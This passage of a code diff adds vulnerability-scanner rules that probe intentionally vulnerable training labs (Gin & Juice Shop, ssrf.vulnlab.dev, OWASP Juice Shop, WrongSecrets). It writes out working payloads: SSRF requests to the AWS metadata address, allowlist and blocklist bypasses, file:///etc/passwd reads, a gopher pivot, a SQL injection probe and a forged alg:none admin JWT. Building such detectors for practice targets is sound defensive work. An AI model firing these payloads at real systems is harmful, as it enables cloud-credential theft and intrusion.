+const ginAndJuiceBlogPostRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blog\/post/i.test(pageUrl)) return NEGATIVE;
+  const result = await ginAndJuiceBlogPostOpenRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Gin & Juice Shop /blog/post route scan — back query param drives client-side location assignment without allowlist"
+    }
+  };
+};
+
+const ginAndJuiceCatalogCategorySqliLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const baselineUrl = new URL("/catalog", ctx.origin);
+  baselineUrl.searchParams.set("category", "1");
+  const baselineDoc = await ctx.probe.get(baselineUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (baselineDoc.status < 200 || baselineDoc.status >= 300) return NEGATIVE;
+  const sqliUrl = new URL("/catalog", ctx.origin);
+  sqliUrl.searchParams.set("category", "1'");
+  const sqliDoc = await ctx.probe.get(sqliUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (sqliDoc.status < 500 || sqliDoc.status >= 600) return NEGATIVE;
+  if (!/Internal Server Error|error/i.test(sqliDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      baselineUrl: baselineUrl.toString(),
+      sqliUrl: sqliUrl.toString(),
+      baselineStatus: baselineDoc.status,
+      sqliStatus: sqliDoc.status,
+      note: "Gin & Juice Shop GET /catalog?category=1' returns HTTP 500 vs category=1 baseline 200 — SQL injection error oracle"
+    }
+  };
+};
+
+const ginAndJuiceCatalogCategorySqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/catalog\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ginAndJuiceCatalogCategorySqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Gin & Juice Shop /catalog route scan — malformed category filter triggers HTTP 500 SQL error vs valid category baseline"
+    }
+  };
+};
+
 // --- Escape API Security Academy (escape.tech/academy) ------------------------------
 const CLIENT_ESCAPE_ACADEMY_RES: { label: string; re: RegExp }[] = [
   {
@@ -30659,6 +35531,851 @@ const clientSideVulnlabA10SsrfEvidence: Rule = async (ctx) => {
   };
 };
 
+function isSsrfVulnlabHost(ctx: RuleContext): boolean {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  return /ssrf\.vulnlab\.dev/i.test(corpus);
+}
+
+/** reachTarget() can pick http://www.ssrf.vulnlab.dev on 404 route scans — labs only live on apex https. */
+function ssrfVulnlabProbeOrigin(ctx: RuleContext): string {
+  if (!isSsrfVulnlabHost(ctx)) return ctx.origin;
+  return "https://ssrf.vulnlab.dev";
+}
+
+async function ssrfVulnlabFetchDoc(
+  url: string,
+  opts?: { maxBytes?: number; timeoutMs?: number }
+): Promise<Awaited<ReturnType<typeof fetchDoc>>> {
+  let doc = await fetchDoc(url, opts);
+  if (doc.status === 503 || doc.status === 429) {
+    await new Promise((r) => setTimeout(r, 1200));
+    doc = await fetchDoc(url, opts);
+  }
+  return doc;
+}
+
+function ssrfVulnlabDecodeBody(raw: string): string {
+  return raw
+    .replace(/&#34;/g, '"')
+    .replace(/&quot;/g, '"')
+    .replace(/&lt;/g, "<")
+    .replace(/&gt;/g, ">")
+    .replace(/&amp;/g, "&");
+}
+
+function ssrfVulnlabLabBody(html: string): string | null {
+  const closed = html.match(/<pre class="body">([\s\S]*?)<\/pre>/i);
+  if (closed) return ssrfVulnlabDecodeBody(closed[1]);
+  // Lab pages can exceed default maxBytes — accept truncated <pre> when closing tag is missing.
+  const open = html.match(/<pre class="body">([\s\S]+)/i);
+  if (open && open[1].length > 40) return ssrfVulnlabDecodeBody(open[1]);
+  return null;
+}
+
+const ssrfVulnlabBasicLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/basic/", origin);
+  probeUrl.searchParams.set("url", `${origin}/`);
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const basicOk =
+    /Intentionally vulnerable SSRF labs/i.test(body) ||
+    /ssrf\.vulnlab\.dev/i.test(body) ||
+    /Basic SSRF/i.test(body);
+  if (!basicOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /basic/?url= fetches attacker-controlled URLs and returns the response body — basic SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabMetadataAwsLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/metadata/", origin);
+  probeUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\//m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /metadata/?url=http://169.254.169.254/latest/meta-data/ returns AWS IMDS metadata tree (ami-id, iam/, instance-id) — cloud metadata SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabBlocklistBypassLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const blockedUrl = new URL("/blocklist/", origin);
+  blockedUrl.searchParams.set("url", "http://127.0.0.1/");
+  const blockedDoc = await ssrfVulnlabFetchDoc(blockedUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (!/banned substring|127\.0\.0\.1/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/blocklist/", origin);
+  bypassUrl.searchParams.set("url", "http://2852039166/latest/meta-data/");
+  const bypassDoc = await ssrfVulnlabFetchDoc(bypassUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  if (/banned substring/i.test(bypassDoc.body)) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body || !/^ami-id\b/m.test(body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      blockedUrl: blockedUrl.toString(),
+      bypassUrl: bypassUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev /blocklist rejects literal 127.0.0.1 but accepts decimal IP 2852039166 (169.254.169.254) and returns AWS metadata — substring blocklist bypass SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const innerTarget = "http://169.254.169.254/latest/meta-data/";
+  const redirectChain = `${origin}/r/?to=${encodeURIComponent(innerTarget)}`;
+  const probeUrl = new URL("/redirect/", origin);
+  probeUrl.searchParams.set("url", redirectChain);
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\//m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      redirectChain,
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /redirect/?url=https://ssrf.vulnlab.dev/r/?to=<internal> passes vulnlab.dev host allow-list then follows redirect to AWS metadata — follow-redirect SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabBasicRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/basic\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabBasicLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabMetadataAwsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/metadata(?:-aws)?\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabMetadataAwsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabBlocklistRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blocklist\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabBlocklistBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/redirect\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabAllowlistBypassLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const blockedUrl = new URL("/allowlist/", origin);
+  blockedUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const blockedDoc = await ssrfVulnlabFetchDoc(blockedUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (!/does not contain.*vulnlab\.dev|URL rejected/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/allowlist/", origin);
+  bypassUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/?vulnlab.dev");
+  const bypassDoc = await ssrfVulnlabFetchDoc(bypassUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) && /hostname|instance-id|iam\//i.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      probeUrl: bypassUrl.toString(),
+      metadataMarkers: body.split(/\n/).slice(0, 6).join(", "),
+      note: "ssrf.vulnlab.dev GET /allowlist/?url=http://169.254.169.254/latest/meta-data/?vulnlab.dev bypasses substring 'vulnlab.dev' allowlist via query string and returns AWS IMDS metadata — allowlist-bypass SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabAllowlistRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/allowlist\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabAllowlistBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabSchemeLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/scheme/", origin);
+  probeUrl.searchParams.set("url", "file:///etc/passwd");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const passwdOk =
+    /^root:x:0:0:/m.test(body) &&
+    /\/bin\/(?:ba)?sh\b/m.test(body) &&
+    /nobody:x:/m.test(body);
+  if (!passwdOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.split("\n").slice(0, 4).join("\n").trim(),
+      note: "ssrf.vulnlab.dev GET /scheme/?url=file:///etc/passwd reads local files via unrestricted file:// scheme — URL-scheme SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabSchemeRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/scheme\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabSchemeLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabGopherLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/gopher/", origin);
+  probeUrl.searchParams.set("url", "gopher://127.0.0.1:6479/_PING");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const gopherOk =
+    /\+VULNLAB\{ssrf-gopher-pivot-to-redis-like-service\}/i.test(body) ||
+    (/VULNLAB\{/i.test(body) && /gopher|6479|PING/i.test(body));
+  if (!gopherOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /gopher/?url=gopher://127.0.0.1:6479/_PING reaches a local TCP service via gopher:// — non-HTTP SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabGopherRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/gopher\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabGopherLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabParserLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const blockedUrl = new URL("/parser/", origin);
+  blockedUrl.searchParams.set("url", "http://169.254.169.254@ssrf.vulnlab.dev/");
+  const blockedDoc = await ssrfVulnlabFetchDoc(blockedUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (!/URL rejected|not in allowlist/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/parser/", origin);
+  bypassUrl.searchParams.set(
+    "url",
+    "http://images.vulnlab.dev@169.254.169.254/latest/meta-data/"
+  );
+  const bypassDoc = await ssrfVulnlabFetchDoc(bypassUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\//m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      blockedUrl: blockedUrl.toString(),
+      bypassUrl: bypassUrl.toString(),
+      snippet: body.split("\n").slice(0, 6).join("\n").trim(),
+      note: "ssrf.vulnlab.dev /parser rejects literal 169.254.169.254 host but accepts images.vulnlab.dev@169.254.169.254 userinfo bypass and returns AWS metadata — URL-parser disagreement SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabParserRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/parser\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabParserLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabBlindLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/blind/", origin);
+  probeUrl.searchParams.set("url", "http://example.com/");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body) || doc.body;
+  const blindOk =
+    /\(blind:\s*response discarded\)/i.test(body) &&
+    (/Blind SSRF/i.test(doc.body) || /\/blind\b/i.test(doc.body));
+  if (!blindOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /blind/?url= fetches attacker-controlled URLs but discards the response body — blind SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabBlindRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blind\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabBlindLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const path = "/rest/user/authentication-details";
+  const url = new URL(path, ctx.origin).toString();
+  const now = Math.floor(Date.now() / 1000);
+  const algNoneToken = buildAlgNoneJwt({
+    sub: "thugir-probe-user",
+    role: "admin",
+    iat: now,
+    exp: now + 3600
+  });
+  const badToken = "thugir.invalid.probe.token";
+  const [noAuth, badAuth, noneAuth] = await Promise.all([
+    ctx.probe.get(url, { maxBytes: 4096 }),
+    ctx.probe.get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${badToken}` } }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      headers: { Authorization: `Bearer ${algNoneToken}` }
+    })
+  ]);
+  if (
+    !looksAuthChallenge(noAuth) ||
+    !looksAuthChallenge(badAuth) ||
+    !looksAuthGatedJson(noneAuth) ||
+    !/"role"\s*:\s*"admin"/i.test(noneAuth.body)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      path,
+      statusWithAlgNone: noneAuth.status,
+      responseSample: noneAuth.body.slice(0, 150).trim(),
+      note: "Juice Shop GET /rest/user/authentication-details accepts alg:none JWT and returns admin credentials — dedicated JWT none-algorithm oracle"
+    }
+  };
+};
+
+function isJuiceShopChatbotContext(ctx: RuleContext): boolean {
+  const corpus = `${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  return JUICE_SHOP_HOST_RE.test(corpus) && /\/chatbot\b|#\/chatbot/i.test(corpus);
+}
+
+const juiceShopChatbotApiLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/rest/chat", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ messages: [{ role: "user", content: "hello" }] }),
+    headers: { "Content-Type": "application/json", Accept: "text/event-stream" },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  const sseOk =
+    /data:\s*\{/.test(doc.body) &&
+    (/\[DONE\]/.test(doc.body) || /deltaContent|LLM error|AI_RetryError/i.test(doc.body));
+  if (!sseOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Juice Shop POST /rest/chat accepts unauthenticated SSE chat messages — LLM proxy endpoint exposed (chatbot prompt-injection surface)"
+    }
+  };
+};
+
+const juiceShopChatbotRouteLiveOracle: Rule = async (ctx) => {
+  if (!isJuiceShopChatbotContext(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const result = await juiceShopChatbotApiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+function wrongsecretsChallengeIdFromUrl(url: string): string | null {
+  const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
+  return m?.[1] ?? null;
+}
+
+const wrongsecretsChallengeLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || ctx.origin;
+  if (!/wrongsecrets/i.test(pageUrl)) return NEGATIVE;
+  const challengeId = wrongsecretsChallengeIdFromUrl(pageUrl);
+  if (!challengeId) return NEGATIVE;
+  const canonicalUrl = new URL(`/challenge/challenge-${challengeId}`, ctx.origin).toString();
+  const doc = await fetchDoc(canonicalUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Find the secret hidden in/i.test(doc.body)) return NEGATIVE;
+  if (!/data-cy="answer-textbox"|Enter the secret you found/i.test(doc.body)) return NEGATIVE;
+  const markers: { label: string; sample: string }[] = [];
+  for (const { label, re } of [
+    { label: "WrongSecrets challenge answer UI", re: /data-cy="answer-textbox"/i },
+    {
+      label: "Docker ENV secret walkthrough",
+      re: /Docker ENV based password|docker history --no-trunc/i
+    },
+    {
+      label: "Docker build-arg layer walkthrough",
+      re: /Docker arg based password|layers got constructed/i
+    },
+    {
+      label: "Docker COPY layer secret walkthrough",
+      re: /COPY operations|COPY&#8217;ing|what COPY|hid a key there/i
+    },
+    {
+      label: "Spring application.properties walkthrough",
+      re: /application\.properties|Spring Boot application/i
+    },
+    {
+      label: "Kubernetes configmap walkthrough",
+      re: /K8s Configmap|config-map in the default namespace/i
+    },
+    {
+      label: "HashiCorp Vault metadata walkthrough",
+      re: /Vault Metadata Challenge|secret metadata on a.*wrongsecret|logged root token|port 8200/i
+    },
+    {
+      label: "HashiCorp Vault subkey walkthrough",
+      re: /Vault subkey challenge|root token as below|K8s environment.*root token/i
+    },
+    {
+      label: "HashiCorp Vault template injection walkthrough",
+      re: /HashiCorp Vault Template Injection|Vault Agent sidecar|injected into application environment/i
+    },
+    {
+      label: "Vault challenge focus",
+      re: /challenge focuses on.*Vault|Vault<\/strong>/i
+    },
+    {
+      label: "CI/CD pipeline secrets walkthrough",
+      re: /CI\/CD pipeline|CI\/CD tooling|Github Actions|Exfiltrate the secret using Github/i
+    },
+    {
+      label: "Docker container logs walkthrough",
+      re: /docker logs|find the value for challenge\s*8/i
+    },
+    {
+      label: "Kubernetes pod logs walkthrough",
+      re: /kubectl logs|grep secret/i
+    },
+    {
+      label: "Logging secrets walkthrough",
+      re: /challenge focuses on.*Logging|Logging<\/strong>/i
+    },
+    {
+      label: "AWS Secrets Manager CSI walkthrough",
+      re: /AWS Secrets Manager|CSI-Driver|CSI driver for AWS/i
+    },
+    {
+      label: "IAM privilege escalation walkthrough",
+      re: /IAM privilege escalation|cant-read-secrets/i
+    },
+    {
+      label: "AWS SSM Parameter Store walkthrough",
+      re: /Parameter Store|SSM Parameter/i
+    },
+    {
+      label: "Git history secret walkthrough",
+      re: /Git history|trufflehog3?|Git-secrets|aws_secret_access_key/i
+    },
+    {
+      label: "Git hardcoded password walkthrough",
+      re: /secret called.*password|hardcoded secrets.*grep|clone the repo and use.*grep/i
+    },
+    {
+      label: "Git notes metadata walkthrough",
+      re: /Git [Nn]otes|refs\/notes\/\*|git notes show|git fetch origin ['"]refs\/notes/i
+    },
+    {
+      label: "Advanced C binary reverse-engineering walkthrough",
+      re: /wrongsecrets-advanced-c|GDB and Radare2|encrypted the secret.*reverse engineering/i
+    },
+    {
+      label: "Binary challenge focus",
+      re: /challenge focuses on.*Binary<\/strong>/i
+    },
+    {
+      label: "Git challenge focus",
+      re: /challenge focuses on.*Git<\/strong>/i
+    },
+    {
+      label: "Intro challenge walkthrough",
+      re: /Welcome to OWASP WrongSecrets|opening challenge|challenge focuses on.*Intro/i
+    },
+    {
+      label: "Every challenge secret-hunt walkthrough",
+      re: /Every challenge is about finding a secret|table-of-contents/i
+    },
+    {
+      label: "WrongSecrets desktop Docker run walkthrough",
+      re: /wrongsecrets-desktop|docker run -p 3000:3000/i
+    },
+    {
+      label: "Front-end secret walkthrough",
+      re: /Secrets in front-end code|Development Tools in the browser/i
+    },
+    {
+      label: "Docker bash history walkthrough",
+      re: /\.bash_history|bash_history file within a running container/i
+    },
+    {
+      label: "Cryptography hash walkthrough",
+      re: /challenge focuses on.*Cryptography|MD5 and SHA1 hash|rockyou\.txt password list/i
+    },
+    {
+      label: "Binary C secret walkthrough",
+      re: /Hiding in binaries part 1|wrongsecrets-c(?:-arm|-linux)?|secret in a C binary/i
+    },
+    {
+      label: "Binary C++ secret walkthrough",
+      re: /Hiding in binaries part 2|wrongsecrets-cplus(?:-arm|-linux)?|secret in a C\+\+ binary/i
+    },
+    {
+      label: "Binary Go secret walkthrough",
+      re: /Hiding in binaries part 3|wrongsecrets-golang(?:-arm|-linux)?|secret in a Go binary|the Go binary/i
+    },
+    {
+      label: "Web3 smart contract secrets walkthrough",
+      re: /Secrets in smart contracts|smart contract developer|blockchain does not get rid/i
+    },
+    {
+      label: "Web3 challenge focus",
+      re: /challenge focuses on.*Web3|Web3<\/strong>/i
+    },
+    {
+      label: "Documentation secret sharing walkthrough",
+      re: /challenge focuses on.*Documentation|share an "innocent" piece of data over social media/i
+    },
+    {
+      label: "Social media secret exposure walkthrough",
+      re: /Never share any secrets.*social media|sharing a secret from your application on social media/i
+    },
+    {
+      label: "Secrets management walkthrough",
+      re: /challenge focuses on.*Secrets<\/strong>/i
+    },
+    {
+      label: "Password shucking walkthrough",
+      re: /Password [Ss]hucking|password shucking/i
+    },
+    {
+      label: "Spring Boot Actuator audit walkthrough",
+      re: /Spring Boot Actuator[\s\S]{0,120}[Aa]udit [Ee]vent|audit events, detailed and informative/i
+    },
+    {
+      label: "AES weak MD5 key walkthrough",
+      re: /Cracking AES Encryption with a Weak MD5 Key|MD5 hash of a PIN/i
+    },
+    {
+      label: "AI project specification walkthrough",
+      re: /Project Specification|Challenge 56: Find the Secret|documentation for secrets|LLM instructions/i
+    },
+    {
+      label: "Swift binary secret walkthrough",
+      re: /Hiding in binaries part 5|wrongsecrets-swift|Swift binary/i
+    },
+    {
+      label: "Java CLI binary secret walkthrough",
+      re: /Hiding in binaries part 6|wrongsecrets-java(?:-obfuscated)?|plain Java CLI/i
+    },
+    {
+      label: "Obfuscated Java binary secret walkthrough",
+      re: /Hiding in binaries part 7|wrongsecrets-java-obfuscated|obfuscated Java CLI/i
+    },
+    {
+      label: ".NET self-contained binary walkthrough",
